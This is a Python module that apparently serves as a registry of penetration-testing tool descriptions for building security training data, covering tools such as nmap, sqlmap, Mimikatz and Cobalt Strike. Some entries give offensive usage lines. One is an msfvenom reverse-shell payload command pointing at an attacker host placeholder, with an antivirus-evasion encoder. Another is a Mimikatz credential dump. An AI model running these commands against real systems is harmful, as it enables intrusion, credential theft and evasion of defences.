"""
Centralized Tool Descriptions Registry for Rabit0 Training Data

This module provides standardized, consistent tool descriptions across all
security training scenarios to eliminate contradictions and ensure uniformity.

Usage:
    from tool_registry import get_tool_description, get_tools_for_category

    desc = get_tool_description("nmap")
    tools = get_tools_for_category("web_injection")
"""

import logging
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

# =============================================================================
# STANDARDIZED TOOL DESCRIPTIONS
# =============================================================================

TOOL_DESCRIPTIONS = {
    # Network Scanning & Enumeration
    "nmap": "Network discovery and security auditing tool. Use for port scanning (-sS/-sT), service version detection (-sV), OS detection (-O), and script scanning (-sC). Example: nmap -sV -sC -p- ${TARGET_IP}. Essential for initial reconnaissance.",

    "masscan": "High-speed network scanner capable of scanning entire internet in under 6 minutes. Use for rapid port discovery across large networks. Example: masscan ${TARGET_NETWORK}/24 -p1-65535 --rate 10000. Faster than nmap but less detailed.",

    "Nessus": "Comprehensive vulnerability scanner detecting 65,000+ CVEs, misconfigurations, and compliance issues. Commercial tool requiring license. Use for thorough vulnerability assessment and compliance reporting.",

    # Web Application Testing
    "Burp Suite": "Integrated web application testing platform. Core features: intercepting proxy (Burp Proxy), request repeater (Repeater), scanner (Scanner Pro), intruder for fuzzing. Essential for manual and automated web testing. Configure browser to use http://localhost:8080 as proxy.",

    "OWASP ZAP": "Open-source web application security scanner. Features: automatic scanner, fuzzer, proxy, spider. Free alternative to Burp Suite. Use: zap.sh -quickurl ${TARGET_URL} for automated scanning.",

    "sqlmap": "Automated SQL injection detection and exploitation tool. Supports 6 SQL injection techniques and all major databases. Usage: sqlmap -u '${TARGET_URL}?id=1' --batch --dbs. Use --batch for non-interactive mode, --risk/--level to adjust testing intensity.",

    "Nikto": "Web server scanner detecting 6,700+ potentially dangerous files, outdated software, and misconfigurations. Usage: nikto -h ${TARGET_URL}. Fast but noisy (easily detected).",

    "wfuzz": "Web application fuzzer for brute-forcing: parameters, directories, subdomains, virtual hosts. Usage: wfuzz -c -z file,wordlist.txt --hc 404 ${TARGET_URL}/FUZZ. More flexible than dirb/gobuster.",

    "dirb": "Web content scanner discovering hidden files and directories using wordlist-based approach. Usage: dirb ${TARGET_URL} /usr/share/wordlists/dirb/common.txt. Simple but effective for directory bruteforcing.",

    # Exploitation Frameworks
    "Metasploit": "Comprehensive exploitation framework with 2,000+ exploits, payloads, and auxiliary modules. Usage: msfconsole -> use exploit/module -> set RHOST ${TARGET_IP} -> exploit. Essential for professional penetration testing.",

    "msfvenom": "Metasploit payload generator supporting 50+ formats and encoders. Usage: msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} -f exe -o payload.exe. Use encoders (-e x86/shikata_ga_nai) to evade AV.",

    # Password Cracking & Authentication
    "Hydra": "Network authentication cracker supporting 50+ protocols (SSH, FTP, HTTP, SMB, RDP). Usage: hydra -l ${USER} -P /usr/share/wordlists/rockyou.txt ${TARGET_IP} ssh. Use -t for threads, -V for verbose.",

    "John the Ripper": "Password cracking tool supporting hash types: MD5, SHA, NTLM, bcrypt. Usage: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt. Use --format to specify hash type.",

    "Hashcat": "Advanced GPU-accelerated password recovery tool. Fastest hash cracker supporting 300+ algorithms. Usage: hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt (mode 1000 = NTLM). Use --show to display cracked hashes.",

    "Mimikatz": "Post-exploitation tool extracting plaintext passwords, hashes, PINs, and Kerberos tickets from Windows memory (LSASS). Usage: mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords'. CRITICAL: Only use with explicit authorization.",

    # Windows Active Directory
    "BloodHound": "Active Directory attack path mapping tool using graph theory. Identifies privilege escalation paths, ACL abuse, and shortest paths to Domain Admin. Usage: Run SharpHound collector, import to BloodHound GUI, analyze relationships.",

    "CrackMapExec": "Swiss army knife for pentesting Windows networks. Supports SMB, LDAP, MSSQL, WinRM, SSH protocols. Usage: crackmapexec smb ${TARGET_NETWORK}/24 -u ${USER} -p ${PASSWORD} --shares. Essential for lateral movement and credential spraying.",

    "Impacket": "Python collection of network protocol implementations (SMB, MSRPC, Kerberos). Includes tools: psexec.py, smbexec.py, secretsdump.py, GetNPUsers.py for Kerberos attacks. Essential for post-exploitation without Metasploit.",

    # Mobile Security
    "Frida": "Dynamic instrumentation toolkit for Android/iOS. Hook into running apps, bypass root/jailbreak detection, SSL pinning. Usage: frida -U -f com.app.package -l hook.js. Essential for runtime mobile app analysis.",

    "Objection": "Runtime mobile exploration toolkit built on Frida. Bypass jailbreak detection, SSL pinning, explore app internals on iOS. Usage: objection -g com.app.package explore. More user-friendly than raw Frida.",

    "MobSF": "Mobile Security Framework for automated static and dynamic analysis. Analyzes APK/IPA files for security issues: hardcoded secrets, insecure crypto, vulnerable components. Upload file via web interface for comprehensive report.",

    "apktool": "Tool for reverse engineering Android APK files. Decompiles resources to nearly original form, rebuilds APKs after modifications. Usage: apktool d app.apk (decompile), apktool b app/ (rebuild). Essential for Android app analysis.",

    # Cloud Security
    "ScoutSuite": "Multi-cloud security auditing tool supporting AWS, Azure, GCP, Oracle, Alibaba. Assesses cloud configuration against best practices. Usage: scout aws --profile ${PROFILE}. Generates HTML report with findings.",

    "Pacu": "AWS exploitation framework with 50+ modules for reconnaissance, privilege escalation, data exfiltration. Usage: run aws__enum_account to start. Designed for offensive AWS security testing.",

    # Reverse Engineering & Malware Analysis
    "Ghidra": "NSA's free software reverse engineering framework supporting multiple architectures (x86, ARM, MIPS, PowerPC). Features decompiler (converts assembly to C-like code), debugger, scripting (Java/Python). Essential for binary analysis and exploit development.",

    "IDA Pro": "Commercial disassembler and debugger. Industry standard for reverse engineering with best decompiler (Hex-Rays). Supports 50+ processor types. Expensive but most powerful RE tool available.",

    "Radare2": "Open-source reverse engineering framework. Features disassembler, debugger, binary analysis, hex editor. Usage: r2 binary -> aa (analyze all) -> afl (list functions). Steep learning curve but very powerful.",

    "gdb": "GNU Debugger for analyzing program execution and crashes. Enhanced with pwndbg/peda/gef for exploit development. Usage: gdb ./binary -> break main -> run -> x/20x $rsp (examine stack). Essential for exploit development.",

    "pwndbg": "GDB plugin designed for exploit development. Enhanced display, heap analysis, ROP gadget search. Auto-loads with GDB. Provides clear visualization of registers, stack, heap during debugging.",

    "pwntools": "Python CTF framework and exploit development library. Provides utilities for crafting exploits: shellcode generation, ROP chain building, process interaction. Usage: from pwn import *. Essential for exploit scripting.",

    # Wireless Security
    "aircrack-ng": "Complete suite for wireless network auditing. Capture WPA handshakes (airmon-ng, airodump-ng), crack passwords (aircrack-ng), inject packets (aireplay-ng). Usage: airodump-ng wlan0mon to capture, aircrack-ng -w wordlist.txt capture.cap to crack.",

    "Wireshark": "Network protocol analyzer with deep packet inspection. Supports 2,000+ protocols including ICS protocols (Modbus, DNP3, S7comm). Use display filters (http, tcp.port==80, modbus) to focus analysis. Essential for understanding network traffic.",

    "Kismet": "Wireless network detector, sniffer, and IDS. Detects Wi-Fi, Bluetooth, Zigbee, and other wireless protocols. Passive scanning mode avoids detection. Usage: kismet -c wlan0. Builds database of discovered networks.",

    # IoT & Embedded
    "binwalk": "Firmware analysis tool searching binary images for embedded files and executable code. Essential for firmware extraction. Usage: binwalk -e firmware.bin (extract), binwalk --signature firmware.bin (identify file types).",

    "OpenOCD": "Open On-Chip Debugger for JTAG/SWD debugging of embedded targets. Enables firmware extraction and runtime analysis. Interfaces with ARM Cortex-M/A, MIPS, RISC-V processors.",

    "minicom": "Serial communication program for UART interfaces on embedded devices. Configure baud rate (typically 115200), connect to /dev/ttyUSB0. Used for bootloader access and debug console interaction.",

    # SCADA/ICS
    "s7scan": "Siemens S7 PLC scanner for discovering and fingerprinting S7-300/400/1200/1500 controllers. Identifies CPU type, firmware version, module information. Usage: s7scan -t ${TARGET_IP} or s7scan -n ${TARGET_NETWORK}/24.",

    "mbtget": "Modbus/TCP client for reading/writing registers and coils on PLCs and RTUs. Essential for interacting with Modbus devices. Usage: mbtget -h ${TARGET_IP} -p 502 -r 40001 -c 10 (read 10 holding registers).",

    # Blockchain
    "Slither": "Static analysis framework for Solidity smart contracts. Detects 70+ vulnerabilities: reentrancy, unprotected functions, integer overflow. Usage: slither contract.sol. Essential for smart contract auditing.",

    "Mythril": "Security analysis tool for Ethereum smart contracts using symbolic execution. Detects vulnerability patterns, generates test cases. Usage: myth analyze contract.sol. More thorough but slower than Slither.",

    # Reconnaissance & OSINT
    "theHarvester": "OSINT tool gathering emails, subdomains, hosts, employee names from public sources (Google, Bing, LinkedIn, DNS). Usage: theHarvester -d ${TARGET_DOMAIN} -b all. Essential for passive reconnaissance.",

    "Recon-ng": "Web reconnaissance framework with modules for OSINT gathering. Similar to Metasploit but for recon. Usage: recon-ng -> marketplace install all -> workspaces create ${TARGET}. Modular approach to information gathering.",

    "Shodan": "Search engine for internet-connected devices. Discovers exposed services, vulnerable systems, ICS/SCADA devices. Usage: shodan search '${SEARCH_TERM}' or via web interface. Requires API key for full access.",

    "Maltego": "Data mining tool for link analysis and relationship graphing. Visual OSINT investigations. Commercial tool with free community edition. Excellent for mapping organizational relationships and infrastructure.",

    # Evasion & Obfuscation
    "Veil-Evasion": "Framework for generating AV-evading payloads. Multiple encoding methods and languages (PowerShell, Python, C). Usage: ./Veil.py -> use evasion -> list (show payloads). Useful for red team exercises.",

    "Invoke-Obfuscation": "PowerShell obfuscation framework. Evades signature-based detection, script block logging. Usage: Import-Module Invoke-Obfuscation.psd1 -> Invoke-Obfuscation. Multiple encoding and obfuscation techniques.",

    "DefenderCheck": "Identifies Windows Defender signatures in files. Pinpoints exact bytes triggering detection for targeted obfuscation. Usage: DefenderCheck.exe payload.exe. Essential for AV evasion testing.",

    # Post-Exploitation & C2
    "Empire": "Post-exploitation PowerShell and Python framework. Agent-based control, credential theft, persistence modules. Usage: ./empire -> listeners -> agents. Pure PowerShell agents for Windows environments.",

    "Covenant": "C2 framework for .NET post-exploitation. Web-based interface, built-in obfuscation, flexible listeners. Usage: dotnet run -> navigate to https://localhost:7443. Modern alternative to Empire.",

    "Cobalt Strike": "Commercial adversary simulation and red team operations platform. Malleable C2 profiles, beacon implants, post-exploitation modules. Professional tool requiring license. Industry standard for red teaming.",

    # Social Engineering
    "SET (Social Engineering Toolkit)": "Python-driven framework for social engineering attacks. Create phishing campaigns, credential harvesters, malicious payloads. Usage: setoolkit -> select attack vector. ONLY use with authorization.",

    "GoPhish": "Open-source phishing framework for creating and managing campaigns. Email templates, landing pages, campaign metrics, user training. Web-based interface. Requires authorization before deployment.",

    # Fuzzing
    "AFL (American Fuzzy Lop)": "Security-oriented fuzzer using genetic algorithms and instrumentation-guided fuzzing. Discovers crashes and vulnerabilities in binaries. Usage: afl-fuzz -i input_dir -o output_dir ./target @@",

    "Boofuzz": "Python fuzzing framework, successor to Sulley. Protocol fuzzing, session management, crash detection. Usage: import boofuzz -> define protocol -> fuzz. Useful for network protocol testing.",
}

# =============================================================================
# TOOL CATEGORIES
# =============================================================================

TOOL_CATEGORIES = {
    "network_scanning": ["nmap", "masscan", "Nessus"],
    "web_testing": ["Burp Suite", "OWASP ZAP", "sqlmap", "Nikto", "wfuzz", "dirb"],
    "exploitation": ["Metasploit", "msfvenom"],
    "password_cracking": ["Hydra", "John the Ripper", "Hashcat"],
    "windows_ad": ["Mimikatz", "BloodHound", "CrackMapExec", "Impacket"],
    "mobile": ["Frida", "Objection", "MobSF", "apktool"],
    "cloud": ["ScoutSuite", "Pacu"],
    "reverse_engineering": ["Ghidra", "IDA Pro", "Radare2", "gdb", "pwndbg", "pwntools"],
    "wireless": ["aircrack-ng", "Wireshark", "Kismet"],
    "iot": ["binwalk", "OpenOCD", "minicom", "Ghidra"],
    "scada": ["s7scan", "mbtget", "Wireshark"],
    "blockchain": ["Slither", "Mythril"],
    "osint": ["theHarvester", "Recon-ng", "Shodan", "Maltego"],
    "evasion": ["Veil-Evasion", "Invoke-Obfuscation", "DefenderCheck", "msfvenom"],
    "post_exploit": ["Mimikatz", "BloodHound", "CrackMapExec", "Empire", "Covenant"],
    "c2": ["Cobalt Strike", "Empire", "Covenant"],
    "social_engineering": ["SET (Social Engineering Toolkit)", "GoPhish"],
    "fuzzing": ["AFL (American Fuzzy Lop)", "Boofuzz"],
}

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_tool_description(tool_name: str) -> Optional[str]:
    """
    Get standardized description for a security tool.

    Args:
        tool_name: Name of the tool (case-insensitive)

    Returns:
        Standardized tool description or None if not found
    """
    # Normalize tool name
    for key in TOOL_DESCRIPTIONS.keys():
        if key.lower() == tool_name.lower():
            return TOOL_DESCRIPTIONS[key]

    return None


def get_tools_for_category(category: str) -> List[str]:
    """
    Get recommended tools for a security category.

    Args:
        category: Tool category (e.g., "web_testing", "mobile")

    Returns:
        List of tool names for that category
    """
    return TOOL_CATEGORIES.get(category, [])


def get_multiple_tool_descriptions(tool_names: List[str]) -> Dict[str, str]:
    """
    Get descriptions for multiple tools.

    Args:
        tool_names: List of tool names

    Returns:
        Dictionary mapping tool names to descriptions
    """
    result = {}
    for tool in tool_names:
        desc = get_tool_description(tool)
        if desc:
            result[tool] = desc

    return result


def validate_tool_exists(tool_name: str) -> bool:
    """
    Check if tool exists in registry.

    Args:
        tool_name: Name of the tool

    Returns:
        True if tool exists, False otherwise
    """
    return get_tool_description(tool_name) is not None


# =============================================================================
# VALIDATION
# =============================================================================

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(message)s")
    logger.info("Security Tool Registry")
    logger.info("=" * 70)
    logger.info("Total tools registered: %s", len(TOOL_DESCRIPTIONS))
    logger.info("Tool categories: %s", len(TOOL_CATEGORIES))

    test_tools = ["nmap", "Burp Suite", "Metasploit", "Frida", "Ghidra"]
    logger.info("Sample Tool Descriptions:")
    logger.info("-" * 70)
    for tool in test_tools:
        desc = get_tool_description(tool)
        if desc:
            logger.info("%s: %s...", tool, desc[:100])

    logger.info("=" * 70)
    logger.info("Tool registry loaded successfully - %s tools available", len(TOOL_DESCRIPTIONS))
